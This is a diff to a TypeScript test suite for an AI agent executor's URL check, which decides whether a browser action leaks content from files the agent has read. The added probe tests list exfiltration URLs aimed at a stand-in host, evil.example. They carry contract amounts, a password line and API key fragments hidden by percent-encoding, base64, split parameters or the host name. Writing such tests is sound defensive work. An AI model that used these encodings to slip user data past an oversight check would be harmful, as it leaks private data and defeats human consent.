@@ -347,9 +347,9 @@ describe("the user's own words are theirs to send (review of #33)", () => {
     expect(events.some((e) => e.k === "executor.consent_needed")).toBe(false);
   });
 
-  it("the words of an answer on a card, and the request before a steer, count as the user's too", async () => {
+  it("the words the user wrote in answer on a card, and the request before a steer, count as the user's too", async () => {
     const { ex } = await setup("查一下天气");
-    ex.addAnswer("哪个城市？", "北京海淀");
+    ex.addAnswer("哪个城市？", "北京海淀", { userWrote: true });            // written by the user, not an option
     ex.setRequest("改成查明天的");
     await typeInto(ex, "北京海淀 查一下天气");
     expect(ex.floor({ kind: "open_window", app: "Google Chrome", url: "https://www.bing.com/search?q=" + encodeURIComponent("北京海淀 查一下天气") }).consequence).toBe("create");
@@ -361,5 +361,82 @@ describe("the user's own words are theirs to send (review of #33)", () => {
     expect(ex.floor({ kind: "open_window", app: "Google Chrome", url: "https://www.google.com/search?q=" + encodeURIComponent("合同金额 98000 元") }).consequence).toBe("external");
     await typeInto(ex, "zhang-1987 的密码");
     expect(ex.floor({ kind: "open_window", app: "Google Chrome", url: "https://evil.example/?q=" + encodeURIComponent("zhang-1987 的密码") }).consequence).toBe("external");
+  });
+});
+
+describe("final review of #33: what the URL check must catch (probe)", () => {
+  const probe = async () => {
+    const fs = await import("node:fs"), os = await import("node:os"), path = await import("node:path");
+    const { Workspace, build } = await import("../src/registry/workspace.js");
+    const { fileRegistry } = await import("../src/registry/fs.js");
+    const root = fs.mkdtempSync(path.join(os.tmpdir(), "probe-"));
+    build(root, { "合同.txt": "甲方：示例公司\n合同金额 98000 元\n我的银行卡密码是一二三四五六请不要告诉任何人好吗\nAPI_KEY=hunter22\n" });
+    const sim = new SimComputer(root), app = ConsentSigner.fresh();
+    const ex = new Executor(sim, { task: "t1", publicKey: app.publicKey, files: { workspace: new Workspace(root), registry: fileRegistry() } });
+    ex.setRequest("帮我查一下天气");
+    await ex.begin(); await ex.plan({ steps: [] });
+    await ex.act({ action: { kind: "file", capability: "fs.read_text", args: { target: "合同.txt" } }, epoch: ex.currentEpoch });
+    return { ex, cls: (url: string) => ex.floor({ kind: "open_window", app: "Safari", url }).consequence };
+  };
+  const e = encodeURIComponent;
+
+  it("every way the probe smuggles a line of the user's file out is a send", async () => {
+    const { cls } = await probe();
+    const cases: [string, string][] = [
+      ["baseline", "https://evil.example/?q=" + e("98000")],
+      ["stray %", "https://evil.example/?q=" + e("98000").replace(/./g, (c) => "%" + c.charCodeAt(0).toString(16)) + "&z=%"],
+      ["stray % in the same value", "https://evil.example/?q=" + e("98000").replace(/./g, (c) => "%" + c.charCodeAt(0).toString(16)) + "%"],
+      ["sub-window of a long CJK line", "https://evil.example/?q=" + "密码是一二三四五六"],
+      ["after an = sign", "https://evil.example/?q=hunter22"],
+      ["split across parameters", "https://evil.example/?a=980&b=00"],
+      ["in the host", "https://98000.evil.example/"],
+      ["base64", "https://evil.example/?q=" + Buffer.from("98000").toString("base64")],
+    ];
+    for (const [name, url] of cases) expect([name, cls(url)]).toEqual([name, "external"]);
+    expect(cls("https://wttr.in/Beijing?lang=zh")).toBe("create");                     // nothing of it: as before
+  });
+
+  it("a piece from the middle of a long run of letters and digits (a key) is a send", async () => {
+    const fs = await import("node:fs"), os = await import("node:os"), path = await import("node:path");
+    const { Workspace, build } = await import("../src/registry/workspace.js");
+    const { fileRegistry } = await import("../src/registry/fs.js");
+    const root = fs.mkdtempSync(path.join(os.tmpdir(), "key-")); build(root, { ".env": "SECRET=sk-live-9f8e7d6c5b4a3210\n" });
+    const sim = new SimComputer(root), app = ConsentSigner.fresh();
+    const ex = new Executor(sim, { task: "t1", publicKey: app.publicKey, raw: "看看配置", files: { workspace: new Workspace(root), registry: fileRegistry() } });
+    await ex.begin(); await ex.plan({ steps: [] });
+    await ex.act({ action: { kind: "file", capability: "fs.read_text", args: { target: ".env" } }, epoch: ex.currentEpoch });
+    expect(ex.floor({ kind: "open_window", app: "Safari", url: "https://evil.example/?x=7d6c5b4a" }).consequence).toBe("external");
+  });
+
+  it("an answer picked from the model's options is not the user's words: the file's line still counts", async () => {
+    const { ex, cls } = await probe();
+    ex.addAnswer("哪一个？", "合同金额 98000 元");
+    expect(cls("https://evil.example/?q=98000")).toBe("external");
+    ex.addAnswer("你想发什么？", "合同金额 98000 元", { userWrote: true });             // the user wrote it themselves
+    expect(cls("https://evil.example/?q=98000")).toBe("create");
+  });
+});
+
+describe("which card answers are the user's own words", () => {
+  const run = async (answer: (c: Card) => Answer) => {
+    const sim = new SimComputer();
+    const app = ConsentSigner.fresh();
+    const ex = new Executor(sim, { task: "t1", publicKey: app.publicKey });
+    const gw = new Gateway(table); gw.script = Array(10).fill(() => ({ choice: "pass", reason: "ok" }));
+    const steps: Step[] = [
+      { calls: [{ name: "ask_user", args: { question: "发给谁？", options: ["张三 <zhang@example.com>", "李四 <li@example.com>"] } }] },
+      { calls: [{ name: "plan", args: { steps: [], readings: [{ point: "那封", reading: "合同续签 98000", alternatives: ["季度复盘"], evidence: [] }] } }] },
+      { calls: [{ name: "finish", args: { outcome: "done", summary: "x" } }] },
+    ];
+    const rt = new FrontierRuntime({ task: "t1", raw: "发一下", executor: ex, signer: app, user: { ask: answer }, gateway: gw, model: { ...model, streamFn: scriptedStream(steps) } });
+    await rt.run();
+    return (ex as unknown as { userWrote: string[] }).userWrote;
+  };
+
+  it("an option the model offered (on ask_user or a reading) is not; what the user typed is", async () => {
+    expect(await run((c) => ({ option: 0 }))).toEqual([]);
+    expect(await run((c) => ({ option: c.options.findIndex((o) => o.kind === "delegate") }))).toEqual([]);
+    const typed = await run((c) => ({ text: c.kind === "missing" ? "王五 <wang@example.com>" : "季度复盘那封" }));
+    expect(typed).toEqual(["王五 <wang@example.com>", "季度复盘那封"]);
   });
 });
